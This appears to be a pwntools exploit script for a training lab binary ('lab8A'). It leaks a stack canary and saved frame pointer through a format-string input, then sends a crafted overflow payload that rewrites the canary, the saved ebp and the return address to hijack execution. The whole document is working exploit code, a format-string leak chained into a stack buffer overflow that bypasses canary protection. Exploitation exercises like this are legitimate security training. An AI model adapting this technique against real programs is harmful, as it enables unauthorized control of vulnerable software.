from pwn import *

p = process(["/levels/lab08/lab8A"])
log.info(util.proc.pidof(p))
pause()

log.info("Leaking canary and saved ebp")
p.recv()
p.sendline("0x%130$08X:0x%131$X")
buf = p.recv(21)
canary, ebp = [int(n, 16) for n in buf.split(":")]
log.info("Got canary 0x{:x}".format(canary))
log.info("Got ebp 0x{:x}".format(ebp))
p.sendline("A")

target_val = 0xdeadbeef ^ canary
log.info("Check is expecting 0x{:x}".format(target_val))
v1 = 0xdeadbeef
RA = 0x080491eb

payload = "A"*16+p32(v1)+"____"+p32(canary)+p32(ebp)+p32(RA)
log.info("Sending {}".format(payload))

p.recvuntil("..I like to read ^_^ <==  ")
p.sendline(payload)
print p.recv()
